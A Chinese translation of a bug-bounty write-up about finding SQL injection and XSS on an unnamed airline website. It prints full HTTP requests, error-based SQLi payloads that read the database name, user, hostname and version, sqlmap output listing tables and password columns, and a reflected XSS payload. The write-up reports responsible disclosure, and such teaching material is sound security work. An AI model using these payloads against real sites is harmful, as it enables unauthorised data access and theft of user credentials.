> 原文链接: https://www.anquanke.com//post/id/86763 


# 【挖洞经验】看我如何挖掘到了某热门网站上的SQLi和XSS漏洞


                                阅读量   
                                **133685**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：medium.com
                                <br>原文地址：[https://medium.com/@mkhizerjaved/sqli-xss-vulnerabilities-in-a-popular-airlines-website-bugbounty-poc-5c0d71f935c1](https://medium.com/@mkhizerjaved/sqli-xss-vulnerabilities-in-a-popular-airlines-website-bugbounty-poc-5c0d71f935c1)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t0178efb8ee19fddcc2.jpg)](https://p3.ssl.qhimg.com/t0178efb8ee19fddcc2.jpg)

译者：[WisFree](http://bobao.360.cn/member/contribute?uid=2606963099)

预估稿费：130RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

**简介**



在上个月的日常挖洞过程中，我发现了一个当前十分热门的航空公司网站，并在该网站中发现了几个安全漏洞。由于这个网站还没有设立公开的漏洞奖励计划，所以我们不便在此透露该网站的真实身份，我们索性认为它的域名为**goodwebsite.com**。接下来我会给大家介绍我如何挖到了该网站中存在的SQL注入漏洞以及XSS（跨站脚本）漏洞。

<br>

**SQL注入漏洞有什么作用?**

****

简而言之，这种SQL注入漏洞将允许未经身份验证得用户从目标网站的数据库中获取数据，其中也包括很多敏感的用户信息。

<br>

**为什么会存在这种安全问题?**

****

之所以这里会存在SQL注入漏洞，主要是因为**goodwebsite.com**的登录页面在处理用户的输入数据时，没有过滤掉其中可能存在的敏感字符，相当于他们直接将用户的输入数据插入到了一条或多条原始的SQL查询语句之中。通过使用这种攻击向量，攻击者可以从目标网站的数据库中获取到用户的密码哈希以及其他的数据。

因此，我在测试该网站登录页面的时候，我随机输入了一堆用户名和密码之后，用Burp Suite拦截下了浏览器发送的请求，然后把用户名改成了“**Test%27**”。修改完请求之后，我将该请求转发到了Burp Repeater，最后我得到了一个包含错误信息的响应。请求和响应的错误信息如下所示：



```
Request:POST /register-login/check.php HTTP/1.1
Content-Length: 76
Content-Type: application/x-www-form-urlencoded
Cookie: bmslogin=no; bmsid=f3011db015dca9a4f2377cd4e864f724
Host: goodwebsite.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*
strLogin=Test%27&amp;strPassword=k

Response Error:
&lt;pre&gt;PDOException Object ( [message:protected] =&gt; SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near Test’ ‘ and `valid_id` = 1’ at line 1 [string:Exception:private] =&gt; [code:protected] =&gt; 42000 [file:protected] =&gt; /var/www/goodwebsite.server.com/register-login/send.php [line:protected] =&gt; 10 [trace:Exception:private] =&gt; Array ( [0] =&gt; Array ( [file] =&gt; /var/www/goodwebsite.server.com/register-login/send.php [line] =&gt; 10 [function] =&gt; query [class] =&gt; PDO [type] =&gt; -&gt; [args] =&gt; Array ( [0] =&gt; SELECT * FROM `wp_ggg_user` WHERE `login` = Test’e ‘ and `valid_id` = 1; ) [previous:Exception:private] =&gt; [errorInfo] =&gt; Array ( [0] =&gt; 42000 [1] =&gt; 1064 [2] =&gt; You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near Test’ ‘ and `valid_id` = 1’ at line 1 ) &lt;/pre&gt;
```

当我看到响应信息中的这些错误提示之后，我第一反应就是应该尝试一下其他的SQL查询语句，而我第一次测试所使用的查询语句如下所示：

```
Test%27and extractvalue(1,concat(0x00a,database()))or’
```

这一次服务器返回的错误信息与之前非常相似，但是响应信息的结尾部分却有一点点不一样…



```
[previous:Exception:private] =&gt;
 [errorInfo] =&gt; Array
 (
 [0] =&gt; HY000
 [1] =&gt; 1105
 [2] =&gt; XPATH syntax error: ‘
goodwebsite’
 )
```

因此，错误信息相当于已经把goodwebsite网站的数据库名称返回给我了：

[![](https://p5.ssl.qhimg.com/t017e2627c388e34a40.png)](https://p5.ssl.qhimg.com/t017e2627c388e34a40.png)

除此之外，我还测试了一些其他基本的查询参数。例如：



```
system_user()
@@version
database()
@@hostname
@@datadir
@@GLOBAL.VERSION
session_user()
schema()
UUID()
```

接下来，我所测试的查询语句如下所示：

```
Test%27and extractvalue(1,concat(0x00a,system_user()))or’
```

这一次返回的错误信息如下：



```
[previous:Exception:private] =&gt;
 [errorInfo] =&gt; Array
 (
 [0] =&gt; HY000
 [1] =&gt; 1105
 [2] =&gt; XPATH syntax error: ‘
goodwebsite@localhost’
 )
```

从响应信息中来看，我们已经获取到了System_User：

[![](https://p4.ssl.qhimg.com/t01da11d8857799693c.png)](https://p4.ssl.qhimg.com/t01da11d8857799693c.png)

这样一来，这个SQL注入漏洞就已经成功确认了，但是我还想更加深入一下，看看能不能获取到更多有价值的信息，而我所使用的第三条测试语句如下所示：

```
Test%27and extractvalue(1,concat(0x00a,@@hostname))or’
```

而这一次我得到的错误信息如下：



```
[previous:Exception:private] =&gt;
    [errorInfo] =&gt; Array
        (
            [0] =&gt; HY000
            [1] =&gt; 1105
            [2] =&gt; XPATH syntax error: '
www2.rz.something.com'
        )
```

这一次，我成功获取到了目标站点的主机名hostname：

[![](https://p3.ssl.qhimg.com/t0139433ce8dd4f28fe.png)](https://p3.ssl.qhimg.com/t0139433ce8dd4f28fe.png)

等等，我竟然忘记检查数据库的版本了！所以我又使用了下面这条查询语句：

```
Test%27and extravtcalue(1,concat(0x00a,@@version))or’
```

响应中的错误信息输出如下所示：



```
[previous:Exception:private] =&gt;
[errorInfo] =&gt; Array
(
[0] =&gt; HY000
[1] =&gt; 1105
[2] =&gt; XPATH syntax error: ‘
5.1.73–1+deb6u1-log’
)
```

[![](https://p0.ssl.qhimg.com/t011c70e1fd0f3dc5cb.png)](https://p0.ssl.qhimg.com/t011c70e1fd0f3dc5cb.png)

接下来就是UUID了，这一步我所用的测试语句如下所示:<br>



```
Test%27and extractvalue(1,concat(0x00a,UUID())or’
[previous:Exception:private] =&gt;
 [errorInfo] =&gt; Array
 (
 [0] =&gt; HY000
 [1] =&gt; 1105
 [2] =&gt; XPATH syntax error: ‘
ab88…..UUDI’
 )
```

服务器端返回的信息如下所示，其中包含了UUID：

[![](https://p2.ssl.qhimg.com/t01507db95b17f3125b.png)](https://p2.ssl.qhimg.com/t01507db95b17f3125b.png)

到现在为止，我已经收集到了很多有价值的信息了，而且这些信息已经足以能够证明这个SQL注入的破坏力和影响力了。但是我想要的永远更多，而我又不想浪费时间，所以接下来我打开了终端并运行了sqlmap，下面是sqlmap的扫描结果：



```
web server operating system: Linux Debian 6.0 (squeeze)
web application technology: Apache 2.2.16, PHP 5.4.42
back-end DBMS: MySQL &gt;= 5.0
Database: goodwebsite[18 tables]
+ — — — — — — — — — — — — -+
| wp_bms_log |
| wp_bms_quiz_lh_answer |
| wp_bms_quiz_lh_question |
| wp_bms_quiz_lh_quiz |
| wp_bms_statistics |
| wp_bms_user |
| wp_commentmeta |
| wp_comments |
| wp_links |
| wp_options |
| wp_postmeta |
| wp_posts |
| wp_term_relationships |
| wp_term_taxonomy |
| wp_termmeta |
| wp_terms |
| wp_usermeta |
| wp_users |
+ — — — — — — — — — — — — -+Then:Table: wp_users
[10 columns]
+ — — — — — — — — — — -+ — — — — — — — — — — -+
| Column | Type |
+ — — — — — — — — — — -+ — — — — — — — — — — -+
| display_name | varchar(250) |
| ID | bigint(20) unsigned |
| user_activation_key | varchar(255) |
| user_email | varchar(100) |
| user_login | varchar(60) |
| user_nicename | varchar(50) |
| user_pass | varchar(255) |
| user_registered | datetime |
| user_status | int(11) |
| user_url | varchar(100) |
+ — — — — — — — — — — -+ — — — — — — — — — — -+
```

SQLmap的扫描结果截图：

[![](https://p4.ssl.qhimg.com/t013a77ae6b578d55ac.png)](https://p4.ssl.qhimg.com/t013a77ae6b578d55ac.png)

<br>

**XSS（跨站脚本漏洞）**

****

接下来的任务就是要测试一下该网站的其他节点，看看是不是还存在其他的一些安全漏洞。不一会儿，我便发现了一个节点：

```
goodwebsite.com/register-login/send.php
```

这个节点接受POST请求，并且还有一个参数“strSendMail=”

于是我按照之前的方法对这个节点进行了一次相同的SQL注入漏洞测试，测试结果（服务器端返回的错误信息）也与之前的一样。但是我在这里准备尝试使用XSS Payload，看看能有什么效果。我使用的XSS Payload如下所示：

```
e’%22()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;prompt(/khizer/)&lt;/ScRiPt&gt;
```

请求信息如下所示：



```
POST /register-login/send.php HTTP/1.1
Content-Length: 60
Content-Type: application/x-www-form-urlencoded
Referer: http://goodwebsite.com/
Cookie: bmslogin=no; bmsid=f3011db015dca9a4f2377cd4e864f724
Host: goodwebsite.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*strSendMail=e’%22()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;prompt(/khizer/)&lt;/ScRiPt&gt;
```

请求发送之后，效果如下图所示：BOOM！！！

[![](https://p2.ssl.qhimg.com/t0192a02d8faaf3c3fa.png)](https://p2.ssl.qhimg.com/t0192a02d8faaf3c3fa.png)

<br>

**后话**

****

我发现了这些漏洞之后，便立刻将漏洞的详细信息上报给了这家公司，而这家公司的技术人员也在一个小时之内成功修复了这些漏洞，他们给我的回复信息如下：

[![](https://p2.ssl.qhimg.com/t012651788fa044d00a.png)](https://p2.ssl.qhimg.com/t012651788fa044d00a.png)

我还专门问了他们是否可以在HackerOne上面单独开一个秘密项目，但是他们表示目前还无法做到这个，但不管怎样，这一次的挖洞经历还是非常有意思的，因此我也希望将其分享给广大社区的朋友们。
